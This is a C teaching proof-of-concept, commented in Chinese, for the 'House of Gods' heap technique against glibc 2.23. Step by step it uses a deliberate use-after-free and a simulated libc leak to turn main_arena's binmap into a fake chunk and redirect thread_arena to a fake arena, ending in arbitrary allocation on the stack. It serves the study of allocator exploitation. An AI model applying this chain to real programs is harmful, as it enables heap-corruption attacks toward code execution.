/*
 * 中文导读：本文件对应 house_of_gods 手法，标注的版本范围是 2.23。
 * 模拟的漏洞是能泄露 heap/libc 地址，并劫持 main_arena.next、
 * system_mem 与 narenas 这三个字段；核心流程是把 binmap 当作 fake
 * chunk 构造出一个 fake arena，再借助 arena 重用逻辑让 thread_arena
 * 指向它。成功判据是后续 malloc 都受这个 fake arena 控制；2.27 的
 * arena/fastbin 加固使这条链终止。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

/* House of Gods 教学 PoC：逐步验证 binmap 伪块与 arena 劫持。 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <inttypes.h>

/*
 * House of Gods 是一种 arena 劫持技术：攻击者先把 main_arena 内部的
 * binmap 字段解释成一个可以从 unsorted bin 取出的伪 chunk，由此获得
 * 对 main_arena.next 与 system_mem 的写权限；再放大 narenas，连续触发
 * reused_arena，让主线程的 thread_arena 最终指向攻击者伪造的
 * malloc_state。arena 一旦被替换，各个 bin 头都由攻击者控制，任意地址
 * 分配和后续代码执行就转化成了常规的链表伪造问题。
 *
 * 原版最小链的前置条件是：
 * - 约 8 次任意尺寸的分配就能完成 arena 劫持，如果还要继续打到代码执行，
 *   通常再需要约 2 次；
 * - 能控制某个 chunk 用户区最前面的 5 个机器字；
 * - 对一个 unsorted chunk 做一次 write-after-free；
 * - 已经拿到堆地址和 libc 地址的泄露。
 *
 * 本 PoC 为了逐步展示 binmap、unsorted 链和 fake arena 各自的作用，分配
 * 次数比最小理论链更多。它最终只验证了 thread_arena 被成功替换，并从
 * 伪造的 arena 的 fastbin 中返回栈上的 fake chunk；至于拿到完整 arena
 * 控制权之后如何连接到任意代码执行，这里不再展开。
 *
 * 完整原始说明：
 * https://github.com/Milo-D/house-of-gods/blob/master/rev2/HOUSE_OF_GODS.TXT
 * 所利用的 glibc 缺陷报告：
 * https://sourceware.org/bugzilla/show_bug.cgi?id=29709
 *
 * 原作者：David Milosevic（milo）。原文声称覆盖 glibc 2.23~2.26，但本项目
 * 把“原代码可以直接成立”严格限定在 2.23~2.25；2.26 因为多了 tcache 路由
 * 和 hidden 符号偏移，需要额外适配，不能只把原 PoC 原样编译就直接宣称可用。
 */

/* <--- 利用流程从这里开始 ---> */

int main(void) {

    /*
     * 申请一个物理尺寸 0x90 的 small chunk。稍后会把它整理进 smallbin，
     * mark_bin 会在 binmap 里设置一个可以被解释成伪 size 的位。
     */
    void *SMALLCHUNK = malloc(0x88);

    /*
     * 申请第一个 fastbin chunk，物理尺寸 0x20；之后释放它，用它的链表头
     * 在 main_arena 重叠的位置伪造出 binmap 伪块所需的 size 字段。
     */
    void *FAST20 = malloc(0x18);

    /*
     * 申请第二个 fastbin chunk，物理尺寸 0x40；它遗留下来的 bk 数据和
     * fastbin 链头位置，稍后用来补上被重定向之后的 unsorted 链。
     */
    void *FAST40 = malloc(0x38);

    /* 释放 SMALLCHUNK，让它进入 unsorted bin，fd/bk 同时留下 libc 指针。 */
    free(SMALLCHUNK);

    /*
     * 模拟 libc 地址泄露：读取 unsorted victim 的 fd，也就是 main_arena
     * 中 unsorted 表头附近的地址。后面用到的所有 hidden 全局量，都是基于
     * 这次泄露的地址做加减偏移定位的。
     */
    const uint64_t leak = *((uint64_t*) SMALLCHUNK);

    /*
     * 申请一个比 SMALLCHUNK 更大的 0xa0 物理块，逼着 unsorted 遍历没法
     * 直接使用这个 0x90 的 victim，只能把它整理进 0x90 的 smallbin，
     * 并由 mark_bin 顺手设置 binmap。
     */
    void *INTM = malloc(0x98);

    /*
     * 重新取出刚才进入 smallbin 的 SMALLCHUNK。这次复用不是思路上的必须
     * 步骤，只是为了让教学用的堆布局更紧凑，减少无关 chunk 对链表输出
     * 造成的干扰。
     */
    SMALLCHUNK = malloc(0x88);

    /* 再释放一次复用后的 SMALLCHUNK，让它重新成为可以通过 UAF 改写 bk 的 unsorted victim。 */
    free(SMALLCHUNK);

    /*
     * 核心漏洞原语：SMALLCHUNK 已经释放进了 unsorted，我们却仍然拿着
     * 旧指针覆盖它的 bk。这里选的偏移会把 bk 重定向到 main_arena.binmap
     * 构成的那个伪 chunk header。
     */
    *((uint64_t*) (SMALLCHUNK + 0x8)) = leak + 0x7f8;

    /*
     * FAST40 还没释放的时候，它用户区的第二个机器字并不是 fastbin 需要
     * 用到的字段，可以先写入 INTM 的 chunk header 地址。free(FAST40) 只会
     * 更新 fd，不会清空这个预先写好的 bk，所以 FAST40 虽然在 fastbin 里，
     * 依然能在伪造的 unsorted 链中提供一个指向已分配的 INTM 、可以正常
     * 解引用的后继节点。
     *
     * 这样安排是为了给后面的 unsorted-bin attack 保留住 INTM。不能靠
     * 申请 0x40 来触发部分摘链，因为同尺寸的请求会优先被 fastbin 满足，
     * 根本走不到 unsorted 遍历这一步。
     */
    *((uint64_t*) (FAST40 + 0x8)) = (uint64_t) (INTM - 0x10);

    /* 释放 0x20 的 fastbin chunk，让对应的 main_arena 槽位为伪块提供合法的 size 位型。 */
    free(FAST20);

    /* 再释放 0x40 的 fastbin chunk，让它预留的数据为伪造的 unsorted 链提供可解引用的 bk。 */
    free(FAST40);

    /*
     * 申请一个和 binmap 位型 0x200 对应的用户大小 0x1f8；旧版 unsorted
     * 路径会把 main_arena 内部的 binmap 伪块当作精确匹配返回。
     */
    void *BINMAP = malloc(0x1f8);

    /*
     * 把 INTM 的 bk 改到 narenas-0x10。摘链的写入位置是 bck->fd，也就是
     * 基址加 0x10，所以最终会把 unsorted 表头地址写进 narenas。
     */
    *((uint64_t*) (INTM + 0x8)) = leak - 0xa40;

    /*
     * 把 main_arena.system_mem 设成最大值，放宽后续对重叠在 main_arena
     * 上的伪 chunk 的尺寸上界检查，让真实的堆/libc 指针也能被当作合法
     * 的 size 接受。
     */
    *((uint64_t*) (BINMAP + 0x20)) = 0xffffffffffffffff;

    /*
     * 按精确匹配重新申请 INTM，触发表头和 narenas-0x10 之间的部分摘链，
     * 把一个巨大的 unsorted 表头地址写进 narenas，让它超过 arena 数量
     * 上限。
     */
    INTM = malloc(0x98);

    /*
     * 用 BINMAP 返回的指针覆盖 main_arena.next，把它改成 INTM 的 chunk
     * header。连续两次触发 reused_arena 之后，thread_arena 会采用同一个
     * 地址。这里的 INTM 并不是一份完整可靠的 malloc_state，只是为了用
     * 最小的代价演示“thread_arena 可以被定向到任意已知地址”；下面再补上
     * 用到的 0x70 fastbin 槽就能验证这份控制权确实生效。
     */
    *((uint64_t*) (BINMAP + 0x8)) = (uint64_t) (INTM - 0x10);

    /*
     * 第一次故意失败的超大请求会进入 reused_arena；遍历的起点仍然是
     * 当前的 main_arena，所以 thread_arena 先被设置回真实的 main_arena。
     */
    malloc(0xffffffffffffffbf + 1);

    /*
     * 第二次失败请求继续沿着 arena 链遍历，读到的是已经被篡改的
     * main_arena.next，最终把 thread_arena 设置成攻击者选定的 fake
     * 伪 arena。
     */
    malloc(0xffffffffffffffbf + 1);

    /* 在栈上构造一个物理尺寸 0x70 的 fake chunk，作为 arena 劫持之后的分配目标。 */
    uint64_t fakechunk[4] = {

        0x0000000000000000, 0x0000000000000073,
        0x4141414141414141, 0x0000000000000000
    };

    /* 把 fake chunk header 的地址写进 fake arena 的 0x70 fastbin 链头。 */
    *((uint64_t*) (INTM + 0x20)) = (uint64_t) (fakechunk);

    /* 此时 malloc 用的是 thread_arena 指向的伪 arena，应该会从栈上返回这个 fake chunk。 */
    void *FAKECHUNK = malloc(0x68);

    /* 覆盖返回块的用户区；这个地址其实就是 fakechunk[2]，用来验证任意地址分配确实生效。 */
    *((uint64_t*) (FAKECHUNK)) = 0x4242424242424242;

    /* 严格断言栈上的目标值确实被改变了，排除 malloc 恰好返回其他地址的假阳性。 */
    assert(fakechunk[2] == 0x4242424242424242);

    return EXIT_SUCCESS;
}
